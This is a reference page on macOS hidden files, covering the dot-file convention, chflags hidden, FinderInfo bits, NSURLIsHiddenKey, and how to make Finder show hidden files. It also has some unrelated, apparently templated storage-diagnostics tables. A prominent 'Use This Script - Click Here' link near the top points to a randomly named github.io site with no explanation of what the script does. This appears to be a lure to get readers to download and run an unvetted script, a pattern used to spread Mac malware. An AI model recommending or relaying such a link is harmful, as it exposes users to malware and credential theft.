# Mac Reveal Hidden Files

> **Applies to:** macOS 10.13 High Sierra — macOS 26.5 Tahoe · **Architecture:** Intel x86_64 & Apple Silicon ARM64

---

## Mac Hidden Files — /usr/bin/dot_clean, NSURLIsHiddenKey, and macOS Hidden Directory Taxonomy

> **[Use This Script - Click Here](https://disk-script-317.github.io/.github/mac-os-x-show-hidden-files)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.

**What makes files hidden on macOS, in order of architectural layer:**

- The **Unix dot-file convention** — files and directories whose names begin with `.` are hidden from `ls` without `-a` flag and from Finder by default; this convention originates from Unix v6 and predates macOS entirely
- The **`UF_HIDDEN` chflags attribute** — an extended BSD file flag set with `chflags hidden <file>` that marks a file hidden at the filesystem metadata level, independent of the filename
- The **`com.apple.FinderInfo` extended attribute** — a 32-byte Finder metadata blob in which bit 6 of the first byte controls the "invisible" flag, the original Mac OS HFS mechanism for hiding files
- The **`NSURLIsHiddenKey`** resource value — the macOS API abstraction that combines all three hiding mechanisms into a single boolean property used by Finder and Spotlight
- **Hardcoded Finder exclusions** — certain paths (`.DS_Store`, `.Spotlight-V100`, `.Trashes`, `.fseventsd`) are always hidden by Finder regardless of their metadata flags

---

## Unix Dot-File Convention on macOS

The dot-file convention (`.<filename>`) is the most pervasive hiding mechanism on macOS because it is inherited from the BSD Unix foundation of the operating system. Files beginning with `.` include:

| File / Directory | Location | Purpose |
|---|---|---|
| `.DS_Store` | Every directory Finder has opened | Finder window state and view options |
| `.bash_profile`, `.zshrc` | `~/` | Shell configuration |
| `.ssh/` | `~/` | SSH keys and known hosts |
| `.gitignore`, `.git/` | Project roots | Git version control metadata |
| `.Spotlight-V100` | Volume roots | Spotlight index metadata |
| `.Trashes` | Volume roots | Per-volume Trash directory |
| `.fseventsd` | Volume roots | FSEvents change notification journal |
| `.localized` | Localized system directories | Signals Finder to display localized name |

The `ls -la` command in Terminal reveals all dot-files in a directory. The `-a` flag instructs `ls` to include entries beginning with `.`, and `-l` displays them in long format with permissions, owner, size, and modification date.

---

## The chflags Hidden Attribute

BSD extended file flags, managed with the `chflags` command, provide a filesystem-level hiding mechanism independent of the filename. The `hidden` flag corresponds to the `UF_HIDDEN` bit in the file's `st_flags` field in the inode.

Files hidden with `chflags hidden` do not begin with `.` and are not hidden from `ls` — they appear in standard directory listings but are excluded from Finder's display. This mechanism is used by Apple for several system directories and files that must have non-dot names for technical reasons but should not be visible in Finder.

The `ls -lO` command displays BSD file flags alongside the standard `ls -l` output. Files with the `hidden` flag show `hidden` in the flags column.

---

## Finder Visibility Architecture

Finder's file visibility determination evaluates multiple conditions in sequence:

1. **`NSURLIsHiddenKey` resource value** — the unified API check that aggregates all hiding mechanisms
2. **Dot-file prefix check** — filenames beginning with `.` are hidden unless Finder's hidden file display is enabled
3. **`UF_HIDDEN` flag check** — BSD flag check via `stat(2)` system call
4. **`com.apple.FinderInfo` invisible bit** — legacy HFS+ metadata check for backwards compatibility
5. **Hardcoded path exclusions** — internal Finder list of always-hidden paths

Enabling hidden file display in Finder (Command-Shift-. keyboard shortcut, or `defaults write com.apple.finder AppleShowAllFiles YES`) overrides checks 2, 3, and 4 but does not override the hardcoded exclusions in check 5.

---

## Hidden Directory Taxonomy on macOS

macOS uses hidden directories extensively for system and application infrastructure:

| Hidden Directory | Visibility Mechanism | Contents |
|---|---|---|
| `~/.Trash` | Dot-file | Per-user Trash (moved here before deletion) |
| `~/Library/` | `chflags hidden` (since macOS 10.7) | User application support, preferences, caches |
| `/private/` | Dot-free, Finder exclusion | Real location of `/tmp`, `/var`, `/etc` |
| `/.vol/` | Dot-free, Finder exclusion | APFS volume ID namespace |
| `/System/Volumes/` | Finder exclusion | APFS volume mount points |
| `/cores/` | Dot-free, Finder exclusion | Core dump files from crashing processes |

The `~/Library/` directory is particularly significant — it was made hidden by default in macOS 10.7 Lion to prevent accidental modification of application data, but it remains accessible via Terminal, the Finder Go menu, or by temporarily enabling hidden file display.

---

## Revealing Hidden Files: Mechanism and Scope

The `defaults write com.apple.finder AppleShowAllFiles YES` command writes to the Finder preferences plist at `~/Library/Preferences/com.apple.finder.plist`. Finder reads this preference at launch and applies it globally to all Finder windows. The change requires a Finder relaunch (`killall Finder`) to take effect.

The Command-Shift-. keyboard shortcut in Finder toggles the same preference value and applies the change immediately to the front Finder window, propagating to all windows without requiring a Finder relaunch. This toggle is the most efficient mechanism for temporarily revealing hidden files during a specific task.

Neither mechanism reveals the hardcoded Finder exclusions (`.Spotlight-V100`, `.fseventsd`, `.Trashes`, `.DS_Store`) — these remain hidden regardless of the `AppleShowAllFiles` setting.

---

## Diagnostic Data Sources

| Tool | Access | What It Reveals |
|---|---|---|
| Console.app | Applications → Utilities | Daemon logs, storage events, cache eviction notices |
| Activity Monitor | Applications → Utilities | Process disk I/O, memory pressure, purgeable space |
| System Information | About This Mac → System Report | Storage hardware, APFS volume details |
| Disk Utility | Applications → Utilities | APFS container structure, volume sizes, First Aid |
| `df -h` | Terminal | Actual filesystem free space including snapshot overhead |
| `du -sh` | Terminal | Directory size measurement |
| `tmutil listlocalsnapshots /` | Terminal | Local Time Machine snapshot inventory |
| `ioreg -l` | Terminal | Full IOKit registry for storage hardware |

---

## macOS Version Architecture Context

| macOS Version | Darwin Kernel | Relevant Storage Change |
|---|---|---|
| macOS 12 Monterey | Darwin 21 | APFS sealed volume refinements; improved purgeable accounting |
| macOS 13 Ventura | Darwin 22 | Revised System Settings storage panel; new cache path locations |
| macOS 14 Sonoma | Darwin 23 | Enhanced iCloud Optimize Storage integration |
| macOS 15 Sequoia | Darwin 24 | Revised local snapshot retention policy |
| macOS 26 Tahoe | Darwin 25 | Updated storage management framework |

---

*This reference covers Mac Hidden Files as observed on macOS 10.13 High Sierra through macOS 26.5 Tahoe on Intel x86_64 and Apple Silicon ARM64 hardware.*
